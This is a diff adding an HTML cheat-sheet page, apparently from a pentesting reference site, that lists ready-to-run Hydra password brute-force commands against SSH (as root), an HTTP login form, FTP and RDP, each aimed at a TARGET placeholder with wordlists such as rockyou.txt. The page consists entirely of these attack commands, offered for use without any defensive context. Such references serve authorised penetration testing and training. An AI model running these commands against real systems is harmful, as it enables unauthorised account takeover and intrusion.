@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Hydra Cheat</title>
+  <style>
+    body { background:#000; color:#0f0; font-family:monospace; padding:20px; }
+    h2 { color:#00ffcc; }
+    pre { background:#111; padding:12px; border-left:4px solid #0f0; white-space:pre-wrap; }
+    a { color:#0ff; font-size:14px; }
+  </style>
+</head>
+<body>
+  <h2>🔐 Hydra Cheats</h2>
+  <pre>
+# SSH brute force
+hydra -l root -P rockyou.txt ssh://TARGET
+
+# HTTP POST form
+hydra -l admin -P passlist.txt TARGET http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid login"
+
+# FTP brute force
+hydra -L users.txt -P pass.txt ftp://TARGET
+
+# RDP brute (Windows)
+hydra -t 4 -V -f -l admin -P pass.txt rdp://TARGET
+  </pre>
+  <a href="../txt/hydra.txt" target="_blank">🔗 Open raw .txt version</a>
+</body>
+</html>
